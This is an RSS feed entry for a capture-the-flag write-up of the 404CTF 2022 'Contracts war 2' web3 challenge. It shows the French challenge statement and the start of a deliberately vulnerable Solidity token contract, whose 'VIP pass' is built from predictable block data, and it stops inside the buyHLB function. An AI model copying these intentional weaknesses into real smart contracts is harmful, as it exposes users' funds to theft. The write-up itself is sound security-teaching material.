@@ -1,0 +1,591 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>reentrancy on Nodauf</title><link>https://nodauf.dev/tags/reentrancy/</link><description>Recent content in reentrancy on Nodauf</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Wed, 18 May 2022 00:00:00 +0000</lastBuildDate><atom:link href="https://nodauf.dev/tags/reentrancy/index.xml" rel="self" type="application/rss+xml"/><item><title>Writeup 404CTF 2022 - Contracts war 2 (web3)</title><link>https://nodauf.dev/p/writeup-404ctf-2022-contracts-war-2-web3/</link><pubDate>Wed, 18 May 2022 00:00:00 +0000</pubDate><guid>https://nodauf.dev/p/writeup-404ctf-2022-contracts-war-2-web3/</guid><description>&lt;img src="https://nodauf.dev/images/404CTF.png" alt="Featured image of post Writeup 404CTF 2022 - Contracts war 2 (web3)" />&lt;h1 id="statement">Statement&lt;/h1>
+&lt;p>The challenge statement is as follows:&lt;/p>
+&lt;blockquote>
+&lt;p>Agent, maintenant que vous avez des compétences un peu plus approfondies en web3, nous aimerions faire appel à vos compétences dans une situation plus délicate. Nous avons décelé des traces d&amp;rsquo;activités suspectes à l&amp;rsquo;adresse 0xD5c0873f147cECF336fEEF1a28474716C745Df86. Hallebarde essaye apparemment de créer sa propre cryptomonnaie. De plus, il semble que les plus anciens membres de Hallebarde puissent récupérer une sorte de pass VIP. Utilisez ce pass pour obtenir des informations seulement connues par l&amp;rsquo;élite de Hallebarde.&lt;/p>
+&lt;p>Contrat à l&amp;rsquo;adresse : 0xD5c0873f147cECF336fEEF1a28474716C745Df86&lt;/p>
+&lt;p>Réseau de test Ropsten&lt;/p>
+&lt;p>Auteur : Soremo&lt;/p>
+&lt;p>nc challenge.404ctf.fr 30885&lt;/p>
+&lt;/blockquote>
+&lt;p>The source code of the smart contract is given:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt"> 10
+&lt;/span>&lt;span class="lnt"> 11
+&lt;/span>&lt;span class="lnt"> 12
+&lt;/span>&lt;span class="lnt"> 13
+&lt;/span>&lt;span class="lnt"> 14
+&lt;/span>&lt;span class="lnt"> 15
+&lt;/span>&lt;span class="lnt"> 16
+&lt;/span>&lt;span class="lnt"> 17
+&lt;/span>&lt;span class="lnt"> 18
+&lt;/span>&lt;span class="lnt"> 19
+&lt;/span>&lt;span class="lnt"> 20
+&lt;/span>&lt;span class="lnt"> 21
+&lt;/span>&lt;span class="lnt"> 22
+&lt;/span>&lt;span class="lnt"> 23
+&lt;/span>&lt;span class="lnt"> 24
+&lt;/span>&lt;span class="lnt"> 25
+&lt;/span>&lt;span class="lnt"> 26
+&lt;/span>&lt;span class="lnt"> 27
+&lt;/span>&lt;span class="lnt"> 28
+&lt;/span>&lt;span class="lnt"> 29
+&lt;/span>&lt;span class="lnt"> 30
+&lt;/span>&lt;span class="lnt"> 31
+&lt;/span>&lt;span class="lnt"> 32
+&lt;/span>&lt;span class="lnt"> 33
+&lt;/span>&lt;span class="lnt"> 34
+&lt;/span>&lt;span class="lnt"> 35
+&lt;/span>&lt;span class="lnt"> 36
+&lt;/span>&lt;span class="lnt"> 37
+&lt;/span>&lt;span class="lnt"> 38
+&lt;/span>&lt;span class="lnt"> 39
+&lt;/span>&lt;span class="lnt"> 40
+&lt;/span>&lt;span class="lnt"> 41
+&lt;/span>&lt;span class="lnt"> 42
+&lt;/span>&lt;span class="lnt"> 43
+&lt;/span>&lt;span class="lnt"> 44
+&lt;/span>&lt;span class="lnt"> 45
+&lt;/span>&lt;span class="lnt"> 46
+&lt;/span>&lt;span class="lnt"> 47
+&lt;/span>&lt;span class="lnt"> 48
+&lt;/span>&lt;span class="lnt"> 49
+&lt;/span>&lt;span class="lnt"> 50
+&lt;/span>&lt;span class="lnt"> 51
+&lt;/span>&lt;span class="lnt"> 52
+&lt;/span>&lt;span class="lnt"> 53
+&lt;/span>&lt;span class="lnt"> 54
+&lt;/span>&lt;span class="lnt"> 55
+&lt;/span>&lt;span class="lnt"> 56
+&lt;/span>&lt;span class="lnt"> 57
+&lt;/span>&lt;span class="lnt"> 58
+&lt;/span>&lt;span class="lnt"> 59
+&lt;/span>&lt;span class="lnt"> 60
+&lt;/span>&lt;span class="lnt"> 61
+&lt;/span>&lt;span class="lnt"> 62
+&lt;/span>&lt;span class="lnt"> 63
+&lt;/span>&lt;span class="lnt"> 64
+&lt;/span>&lt;span class="lnt"> 65
+&lt;/span>&lt;span class="lnt"> 66
+&lt;/span>&lt;span class="lnt"> 67
+&lt;/span>&lt;span class="lnt"> 68
+&lt;/span>&lt;span class="lnt"> 69
+&lt;/span>&lt;span class="lnt"> 70
+&lt;/span>&lt;span class="lnt"> 71
+&lt;/span>&lt;span class="lnt"> 72
+&lt;/span>&lt;span class="lnt"> 73
+&lt;/span>&lt;span class="lnt"> 74
+&lt;/span>&lt;span class="lnt"> 75
+&lt;/span>&lt;span class="lnt"> 76
+&lt;/span>&lt;span class="lnt"> 77
+&lt;/span>&lt;span class="lnt"> 78
+&lt;/span>&lt;span class="lnt"> 79
+&lt;/span>&lt;span class="lnt"> 80
+&lt;/span>&lt;span class="lnt"> 81
+&lt;/span>&lt;span class="lnt"> 82
+&lt;/span>&lt;span class="lnt"> 83
+&lt;/span>&lt;span class="lnt"> 84
+&lt;/span>&lt;span class="lnt"> 85
+&lt;/span>&lt;span class="lnt"> 86
+&lt;/span>&lt;span class="lnt"> 87
+&lt;/span>&lt;span class="lnt"> 88
+&lt;/span>&lt;span class="lnt"> 89
+&lt;/span>&lt;span class="lnt"> 90
+&lt;/span>&lt;span class="lnt"> 91
+&lt;/span>&lt;span class="lnt"> 92
+&lt;/span>&lt;span class="lnt"> 93
+&lt;/span>&lt;span class="lnt"> 94
+&lt;/span>&lt;span class="lnt"> 95
+&lt;/span>&lt;span class="lnt"> 96
+&lt;/span>&lt;span class="lnt"> 97
+&lt;/span>&lt;span class="lnt"> 98
+&lt;/span>&lt;span class="lnt"> 99
+&lt;/span>&lt;span class="lnt">100
+&lt;/span>&lt;span class="lnt">101
+&lt;/span>&lt;span class="lnt">102
+&lt;/span>&lt;span class="lnt">103
+&lt;/span>&lt;span class="lnt">104
+&lt;/span>&lt;span class="lnt">105
+&lt;/span>&lt;span class="lnt">106
+&lt;/span>&lt;span class="lnt">107
+&lt;/span>&lt;span class="lnt">108
+&lt;/span>&lt;span class="lnt">109
+&lt;/span>&lt;span class="lnt">110
+&lt;/span>&lt;span class="lnt">111
+&lt;/span>&lt;span class="lnt">112
+&lt;/span>&lt;span class="lnt">113
+&lt;/span>&lt;span class="lnt">114
+&lt;/span>&lt;span class="lnt">115
+&lt;/span>&lt;span class="lnt">116
+&lt;/span>&lt;span class="lnt">117
+&lt;/span>&lt;span class="lnt">118
+&lt;/span>&lt;span class="lnt">119
+&lt;/span>&lt;span class="lnt">120
+&lt;/span>&lt;span class="lnt">121
+&lt;/span>&lt;span class="lnt">122
+&lt;/span>&lt;span class="lnt">123
+&lt;/span>&lt;span class="lnt">124
+&lt;/span>&lt;span class="lnt">125
+&lt;/span>&lt;span class="lnt">126
+&lt;/span>&lt;span class="lnt">127
+&lt;/span>&lt;span class="lnt">128
+&lt;/span>&lt;span class="lnt">129
+&lt;/span>&lt;span class="lnt">130
+&lt;/span>&lt;span class="lnt">131
+&lt;/span>&lt;span class="lnt">132
+&lt;/span>&lt;span class="lnt">133
+&lt;/span>&lt;span class="lnt">134
+&lt;/span>&lt;span class="lnt">135
+&lt;/span>&lt;span class="lnt">136
+&lt;/span>&lt;span class="lnt">137
+&lt;/span>&lt;span class="lnt">138
+&lt;/span>&lt;span class="lnt">139
+&lt;/span>&lt;span class="lnt">140
+&lt;/span>&lt;span class="lnt">141
+&lt;/span>&lt;span class="lnt">142
+&lt;/span>&lt;span class="lnt">143
+&lt;/span>&lt;span class="lnt">144
+&lt;/span>&lt;span class="lnt">145
+&lt;/span>&lt;span class="lnt">146
+&lt;/span>&lt;span class="lnt">147
+&lt;/span>&lt;span class="lnt">148
+&lt;/span>&lt;span class="lnt">149
+&lt;/span>&lt;span class="lnt">150
+&lt;/span>&lt;span class="lnt">151
+&lt;/span>&lt;span class="lnt">152
+&lt;/span>&lt;span class="lnt">153
+&lt;/span>&lt;span class="lnt">154
+&lt;/span>&lt;span class="lnt">155
+&lt;/span>&lt;span class="lnt">156
+&lt;/span>&lt;span class="lnt">157
+&lt;/span>&lt;span class="lnt">158
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-solidity" data-lang="solidity">&lt;span class="line">&lt;span class="cl">&lt;span class="k">pragma solidity&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">13&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// solidity &amp;gt; 0.8.0 is using SafeMath by default. No integer underflow or overflow.
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kd">interface&lt;/span> &lt;span class="nc">IERC20&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">function&lt;/span> &lt;span class="nf">totalSupply&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="k">external&lt;/span> &lt;span class="k">view&lt;/span> &lt;span class="k">returns&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">uint256&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">function&lt;/span> &lt;span class="nf">balanceOf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">address&lt;/span> &lt;span class="n">account&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="k">external&lt;/span> &lt;span class="k">view&lt;/span> &lt;span class="k">returns&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">uint256&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">function&lt;/span> &lt;span class="nf">allowance&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">address&lt;/span> &lt;span class="n">owner&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kt">address&lt;/span> &lt;span class="n">spender&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="k">external&lt;/span> &lt;span class="k">view&lt;/span> &lt;span class="k">returns&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">uint256&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">function&lt;/span> &lt;span class="nf">transfer&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">address&lt;/span> &lt;span class="n">recipient&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kt">uint256&lt;/span> &lt;span class="n">amount&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="k">external&lt;/span> &lt;span class="k">returns&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">bool&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">function&lt;/span> &lt;span class="nf">approve&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">address&lt;/span> &lt;span class="n">spender&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kt">uint256&lt;/span> &lt;span class="n">amount&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="k">external&lt;/span> &lt;span class="k">returns&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">bool&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">function&lt;/span> &lt;span class="nf">transferFrom&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">address&lt;/span> &lt;span class="nb">sender&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kt">address&lt;/span> &lt;span class="n">recipient&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kt">uint256&lt;/span> &lt;span class="n">amount&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="k">external&lt;/span> &lt;span class="k">returns&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">bool&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">event&lt;/span> &lt;span class="nc">Transfer&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">address&lt;/span> &lt;span class="k">indexed&lt;/span> &lt;span class="k">from&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kt">address&lt;/span> &lt;span class="k">indexed&lt;/span> &lt;span class="n">to&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kt">uint256&lt;/span> &lt;span class="nb">value&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">event&lt;/span> &lt;span class="nc">Approval&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">address&lt;/span> &lt;span class="k">indexed&lt;/span> &lt;span class="n">owner&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kt">address&lt;/span> &lt;span class="k">indexed&lt;/span> &lt;span class="n">spender&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kt">uint256&lt;/span> &lt;span class="nb">value&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kd">contract&lt;/span> &lt;span class="nc">HallebardeToken&lt;/span> &lt;span class="k">is&lt;/span> &lt;span class="n">IERC20&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kn">using&lt;/span> &lt;span class="n">SafeMath&lt;/span> &lt;span class="k">for&lt;/span> &lt;span class="kt">uint256&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">string&lt;/span> &lt;span class="k">public&lt;/span> &lt;span class="k">constant&lt;/span> &lt;span class="nb">name&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s">&amp;#34;Hallebarde&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">string&lt;/span> &lt;span class="k">public&lt;/span> &lt;span class="k">constant&lt;/span> &lt;span class="n">symbol&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s">&amp;#34;HLB&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">uint8&lt;/span> &lt;span class="k">public&lt;/span> &lt;span class="k">constant&lt;/span> &lt;span class="n">decimals&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">18&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">mapping&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">address&lt;/span> &lt;span class="o">=&amp;gt;&lt;/span> &lt;span class="kt">uint256&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">balances&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">mapping&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">address&lt;/span> &lt;span class="o">=&amp;gt;&lt;/span> &lt;span class="kd">mapping&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">address&lt;/span> &lt;span class="o">=&amp;gt;&lt;/span> &lt;span class="kt">uint256&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="n">allowed&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">mapping&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">address&lt;/span> &lt;span class="o">=&amp;gt;&lt;/span> &lt;span class="kt">uint256&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">seniority&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">mapping&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">address&lt;/span> &lt;span class="o">=&amp;gt;&lt;/span> &lt;span class="kt">uint256&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">lastWithdrawTime&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">uint256&lt;/span> &lt;span class="k">private&lt;/span> &lt;span class="n">vipPass&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">address&lt;/span> &lt;span class="k">private&lt;/span> &lt;span class="n">boss&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">uint256&lt;/span> &lt;span class="n">totalSupply_&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">constructor&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">string&lt;/span> &lt;span class="k">memory&lt;/span> &lt;span class="n">_password&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="k">public&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">totalSupply_&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">1000000&lt;/span> &lt;span class="kc">ether&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">balances&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nb">msg&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nb">sender&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">1000&lt;/span> &lt;span class="kc">ether&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">balances&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="kt">address&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">this&lt;/span>&lt;span class="p">)]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">999000&lt;/span> &lt;span class="kc">ether&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">seniority&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nb">msg&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nb">sender&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">10&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">365&lt;/span> &lt;span class="kc">days&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">boss&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">msg&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nb">sender&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">rand&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">_password&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">function&lt;/span> &lt;span class="nf">rand&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">string&lt;/span> &lt;span class="k">memory&lt;/span> &lt;span class="n">_password&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="k">public&lt;/span> &lt;span class="n">onlyOwner&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">vipPass&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="kt">uint&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">keccak256&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">abi&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nb">encodePacked&lt;/span>&lt;span class="p">(&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">msg&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nb">sender&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">block&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nb">timestamp&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">block&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nb">difficulty&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">vipPass&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">balances&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="kt">address&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">this&lt;/span>&lt;span class="p">)],&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">_password&lt;/span>&lt;span class="p">)));&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">function&lt;/span> &lt;span class="nf">totalSupply&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="k">public&lt;/span> &lt;span class="k">override&lt;/span> &lt;span class="k">view&lt;/span> &lt;span class="k">returns&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">uint256&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">totalSupply_&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">function&lt;/span> &lt;span class="nf">balanceOf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">address&lt;/span> &lt;span class="n">tokenOwner&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="k">public&lt;/span> &lt;span class="k">override&lt;/span> &lt;span class="k">view&lt;/span> &lt;span class="k">returns&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">uint256&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">balances&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">tokenOwner&lt;/span>&lt;span class="p">];&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">function&lt;/span> &lt;span class="nf">seniorityOf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">address&lt;/span> &lt;span class="n">tokenOwner&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="k">public&lt;/span> &lt;span class="k">view&lt;/span> &lt;span class="k">returns&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">uint256&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">seniority&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">tokenOwner&lt;/span>&lt;span class="p">];&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// buyHLB to get HLB token.
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="kd">function&lt;/span> &lt;span class="nf">buyHLB&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="k">public&lt;/span> &lt;span class="k">payable&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">require&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">msg&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nb">value&lt;/span> &lt;span class="o">&amp;gt;&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;Vous avez besoin d&amp;#39;ethereum pour acheter des HLB.&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">require&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">balances&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="kt">address&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">this&lt;/span>&lt;span class="p">)]&lt;/span> &lt;span class="o">&amp;gt;=&lt;/span> &lt;span class="nb">msg&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nb">value&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;Il n&amp;#39;y a plus assez de HLB disponible. Revenez plus tard.&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">balances&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nb">msg&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nb">sender&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">balances&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nb">msg&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nb">sender&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">add&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">msg&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nb">value&lt;/span>&lt;span class="p">);&lt;/span>
